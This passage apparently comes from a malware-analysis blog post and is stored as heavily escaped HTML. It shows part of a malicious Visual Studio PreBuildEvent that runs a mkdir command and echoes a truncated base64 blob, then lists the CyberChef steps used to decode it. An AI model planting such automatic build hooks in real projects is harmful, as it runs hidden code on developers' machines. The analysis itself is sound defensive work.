y z-hexadecimal z-xml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-entity z-xml&quot;&gt;&amp;amp;#x&lt;&#x2F;span&gt;A&lt;span class=&quot;z-punctuation z-terminator z-entity z-xml&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;mkdir &amp;quot;%25a%25&amp;quot; 2&lt;span class=&quot;z-constant z-character z-entity z-named z-xml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-entity z-xml&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;gt&lt;span class=&quot;z-punctuation z-terminator z-entity z-xml&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;nul&lt;span class=&quot;z-constant z-character z-entity z-hexadecimal z-xml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-entity z-xml&quot;&gt;&amp;amp;#x&lt;&#x2F;span&gt;D&lt;span class=&quot;z-punctuation z-terminator z-entity z-xml&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-entity z-hexadecimal z-xml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-entity z-xml&quot;&gt;&amp;amp;#x&lt;&#x2F;span&gt;A&lt;span class=&quot;z-punctuation z-terminator z-entity z-xml&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;echo b = &amp;quot;JFIgPSAiPXdtY2dzVG…
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-xml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-xml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-xml&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-localname z-xml&quot;&gt;PreBuildEvent&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-xml&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;…well, a whole host of encoded data. With some CyberChef assistance:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;decoding HTML entities&lt;&#x2F;li&gt;
&lt;li&gt;URL decoding&lt;&#x2F;li&gt;
&lt;li&gt;replacing &lt;code&gt;&amp;amp;#xD;&amp;amp;#xA;&lt;&#x2F;code&gt; with &lt;code&gt;\r\n&lt;&#x2F;code&gt; (not sure what type of encoding this is)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
